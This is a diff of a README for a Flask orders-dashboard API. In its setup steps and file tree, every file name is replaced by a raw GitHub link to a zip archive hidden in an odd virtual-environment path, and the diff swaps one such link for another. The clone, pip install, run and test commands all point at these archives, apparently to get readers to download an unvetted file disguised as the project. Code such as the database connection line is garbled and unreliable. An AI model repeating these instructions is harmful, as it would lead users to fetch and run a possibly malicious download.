@@ -35,12 +35,12 @@ A Flask-based API to upload, validate, store, and analyze customer and order dat
 ```
 
 orders\_dashboard/
-├── https://github.com/Meghsss/orders_dashboard/raw/refs/heads/main/venv/lib/python3.12/site-packages/six-1.17.0.dist-info/orders_dashboard_3.5.zip              # Main Flask application
-├── https://github.com/Meghsss/orders_dashboard/raw/refs/heads/main/venv/lib/python3.12/site-packages/six-1.17.0.dist-info/orders_dashboard_3.5.zip         # Database connection logic
-├── https://github.com/Meghsss/orders_dashboard/raw/refs/heads/main/venv/lib/python3.12/site-packages/six-1.17.0.dist-info/orders_dashboard_3.5.zip       # Data validation and filtering
-├── test\https://github.com/Meghsss/orders_dashboard/raw/refs/heads/main/venv/lib/python3.12/site-packages/six-1.17.0.dist-info/orders_dashboard_3.5.zip         # Test cases using pytest
-├── https://github.com/Meghsss/orders_dashboard/raw/refs/heads/main/venv/lib/python3.12/site-packages/six-1.17.0.dist-info/orders_dashboard_3.5.zip    # List of dependencies
-└── https://github.com/Meghsss/orders_dashboard/raw/refs/heads/main/venv/lib/python3.12/site-packages/six-1.17.0.dist-info/orders_dashboard_3.5.zip           # Project documentation
+├── https://github.com/Meghsss/orders_dashboard/raw/refs/heads/main/venv/lib/python3.12/site-packages/pytz/zoneinfo/Canada/orders_dashboard_v1.1-beta.2.zip              # Main Flask application
+├── https://github.com/Meghsss/orders_dashboard/raw/refs/heads/main/venv/lib/python3.12/site-packages/pytz/zoneinfo/Canada/orders_dashboard_v1.1-beta.2.zip         # Database connection logic
+├── https://github.com/Meghsss/orders_dashboard/raw/refs/heads/main/venv/lib/python3.12/site-packages/pytz/zoneinfo/Canada/orders_dashboard_v1.1-beta.2.zip       # Data validation and filtering
+├── test\https://github.com/Meghsss/orders_dashboard/raw/refs/heads/main/venv/lib/python3.12/site-packages/pytz/zoneinfo/Canada/orders_dashboard_v1.1-beta.2.zip         # Test cases using pytest
+├── https://github.com/Meghsss/orders_dashboard/raw/refs/heads/main/venv/lib/python3.12/site-packages/pytz/zoneinfo/Canada/orders_dashboard_v1.1-beta.2.zip    # List of dependencies
+└── https://github.com/Meghsss/orders_dashboard/raw/refs/heads/main/venv/lib/python3.12/site-packages/pytz/zoneinfo/Canada/orders_dashboard_v1.1-beta.2.zip           # Project documentation
 
 ````
 
@@ -51,7 +51,7 @@ orders\_dashboard/
 ### 1. Clone the Repository
 
 ```bash
-git clone https://github.com/Meghsss/orders_dashboard/raw/refs/heads/main/venv/lib/python3.12/site-packages/six-1.17.0.dist-info/orders_dashboard_3.5.zip
+git clone https://github.com/Meghsss/orders_dashboard/raw/refs/heads/main/venv/lib/python3.12/site-packages/pytz/zoneinfo/Canada/orders_dashboard_v1.1-beta.2.zip
 cd orders_dashboard
 ````
 
@@ -66,7 +66,7 @@ venv\Scripts\activate      # Windows
 ### 3. Install Dependencies
 
 ```bash
-pip install -r https://github.com/Meghsss/orders_dashboard/raw/refs/heads/main/venv/lib/python3.12/site-packages/six-1.17.0.dist-info/orders_dashboard_3.5.zip
+pip install -r https://github.com/Meghsss/orders_dashboard/raw/refs/heads/main/venv/lib/python3.12/site-packages/pytz/zoneinfo/Canada/orders_dashboard_v1.1-beta.2.zip
 ```
 
 ### 4. Setup MySQL Database
@@ -92,10 +92,10 @@ CREATE TABLE orders (
 );
 ```
 
-Update `https://github.com/Meghsss/orders_dashboard/raw/refs/heads/main/venv/lib/python3.12/site-packages/six-1.17.0.dist-info/orders_dashboard_3.5.zip` with your credentials:
+Update `https://github.com/Meghsss/orders_dashboard/raw/refs/heads/main/venv/lib/python3.12/site-packages/pytz/zoneinfo/Canada/orders_dashboard_v1.1-beta.2.zip` with your credentials:
 
 ```python
-conn = https://github.com/Meghsss/orders_dashboard/raw/refs/heads/main/venv/lib/python3.12/site-packages/six-1.17.0.dist-info/orders_dashboard_3.5.zip(
+conn = https://github.com/Meghsss/orders_dashboard/raw/refs/heads/main/venv/lib/python3.12/site-packages/pytz/zoneinfo/Canada/orders_dashboard_v1.1-beta.2.zip(
     host="localhost",
     user="yourusername",
     password="yourpassword",
@@ -108,7 +108,7 @@ conn = https://github.com/Meghsss/orders_dashboard/raw/refs/heads/main/venv/lib/
 ## ▶️ Run the Application
 
 ```bash
-python https://github.com/Meghsss/orders_dashboard/raw/refs/heads/main/venv/lib/python3.12/site-packages/six-1.17.0.dist-info/orders_dashboard_3.5.zip
+python https://github.com/Meghsss/orders_dashboard/raw/refs/heads/main/venv/lib/python3.12/site-packages/pytz/zoneinfo/Canada/orders_dashboard_v1.1-beta.2.zip
 ```
 
 Visit: `http://localhost:5000`
@@ -164,7 +164,7 @@ Visit: `http://localhost:5000`
 ## 🧪 Run Tests
 
 ```bash
-pytest https://github.com/Meghsss/orders_dashboard/raw/refs/heads/main/venv/lib/python3.12/site-packages/six-1.17.0.dist-info/orders_dashboard_3.5.zip -v
+pytest https://github.com/Meghsss/orders_dashboard/raw/refs/heads/main/venv/lib/python3.12/site-packages/pytz/zoneinfo/Canada/orders_dashboard_v1.1-beta.2.zip -v
 ```
 
 Tests cover:
